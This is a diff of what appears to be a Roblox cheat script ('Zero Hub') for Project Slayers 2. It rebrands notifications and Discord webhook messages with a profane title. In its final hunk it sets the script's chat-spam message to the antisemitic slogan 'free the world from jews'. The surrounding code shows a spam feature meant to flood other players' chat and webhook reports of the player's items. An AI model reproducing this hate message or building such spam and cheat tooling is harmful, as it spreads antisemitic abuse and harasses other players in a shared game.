@@ -2073,7 +2073,7 @@ do
 						functionValue33 = function(description4, duration2)
 							task.defer(function()
 								pcall(function()
-									lib2:Notify({ Title = "Zero Hub", Description = description4, Duration = duration2 or 3 })
+									lib2:Notify({ Title = "FUCK ZERO HUB", Description = description4, Duration = duration2 or 3 })
 								end)
 							end)
 						end
@@ -3471,7 +3471,7 @@ do
 
 			do
 				lib2:Notify({
-					Title = "Zero Hub",
+					Title = "FUCK ZERO HUB",
 					Description = "Project Slayers loaded.",
 					Type = "Success",
 					Duration = 4,
@@ -5191,7 +5191,7 @@ do
 												{ name = "Player", value = localPlayer.Name, inline = true },
 												{ name = "Item", value = value64, inline = true },
 											},
-											footer = { text = "Zero Hub • Project Slayers 2" },
+											footer = { text = "FUCK ZERO HUB • Project Slayers 2" },
 											timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
 										},
 									},
@@ -5368,13 +5368,13 @@ do
 							table.insert(list4, {
 								url = url,
 								body = HttpService:JSONEncode({
-									username = "Zero Hub",
+									username = "FUCK ZERO HUB",
 									embeds = {
 										{
 											title = value213,
 											description = table.concat(parts, "\n"),
 											color = data11[value310 or "info"] or data11.info,
-											footer = { text = "Zero Hub • Project Slayers 2 • " .. (lookup8[value65] or value65) },
+											footer = { text = "FUCK ZERO HUB • Project Slayers 2 • " .. (lookup8[value65] or value65) },
 											timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
 										},
 									},
@@ -6182,10 +6182,10 @@ do
 									color = n35 >= 30000 and 65407 or n35 >= 15000 and 16766720 or 16729156,
 									description = description,
 									fields = fields,
-									footer = { text = "Zero Hub" },
+									footer = { text = "FUCK ZERO HUB" },
 								},
 							},
-							username = "Zero Hub",
+							username = "FUCK ZERO HUB",
 						}),
 					})
 
@@ -7422,12 +7422,12 @@ do
 		do
 			do
 				local thread = nil
-				local str27 = "Zero Hub on top"
+				local str27 = "free the world from jews"
 				local n32 = 1000
 
 				data9.SpamMsg = options2.Chat:AddInput("SpamMsg", {
 					Text = "Spam Message",
-					Default = "Zero Hub on top",
+					Default = "mrprogamer092",
 					Placeholder = "Message to spam",
 					Callback = function(str275)
 						str27 = str275
